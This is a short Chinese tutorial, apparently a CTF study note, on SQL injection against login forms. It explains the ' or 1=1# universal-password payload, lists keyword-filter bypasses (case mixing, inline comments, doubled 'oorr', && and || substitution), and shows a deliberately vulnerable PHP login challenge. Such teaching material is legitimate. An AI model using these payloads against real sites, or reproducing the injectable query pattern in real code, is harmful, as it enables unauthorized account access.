# 有关登录型sql注入的补充

<br>

## 登录型sql注入特征

形如下列语句即为登录型

````
$sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";

````

<br>

## 注入方法以及原理

<br>

万能密码:

````
' or 1=1#
````

<br>

在用户名输入框中输入:’ or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：

````
select * from users where username='' or 1=1#' and password=md5('')
````

语义分析：“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：

````
select * from users where username='' or 1=1#' and password=md5('')
````
　等价于
````
select * from users where username='' or 1=1
````
SQL注入采用的' OR 1=1 # 是什么意思呢？

最后一个#号有什么意义呢？

'#'可以注释掉后面的一行SQL代码

相当于去掉了一个where条件

MySQL 注释, 过滤掉后面的SQL语句，使其不起作用 ,因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句：
````
select * from users 
````
没错，该sql语句的作用是检索users表中的所有字段

<br>

## 绕过

<br>

* 大小写变形，Or，OR，oR，And，ANd，aND等-代码中大小写不敏感都剔除

* 在这两个敏感词中添加注释，例如：a/**/nd 双写绕过oorr

* 利用符号代替--and --&&          --or--||  等


<br>

## 例题

````
$email = $_POST['email'];
    if(!preg_match("/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/", $email)||preg_match("/or/i", $email)){
        echo json_encode(array('status' => 0,'info' => '不存在邮箱为： '.$email.' 的管理员账号！'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $pwd = $_POST['pwd'];
    $pwd = md5($pwd);
    $conn = mysqli_connect("localhost","root","123456","xdsec",3306);


    $sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
    $result = mysqli_query($conn,$sql);
    $row = mysqli_fetch_array($result);

    if($row){
        $_SESSION['admin_id'] = $row['id'];
        $_SESSION['admin_email'] = $row['email'];
        echo json_encode(array('status' => 1,'info' => '登陆成功，moectf{testflag}'));
    } else{
        echo json_encode(array('status' => 0,'info' => '管理员邮箱或密码错误'));
        unset($_SESSION['captcha_code']);
    }
}


````

<br>

解法如图:


<img src="https://54huarui.github.io/blogs/sqllogin/0.png" width="880" height="480">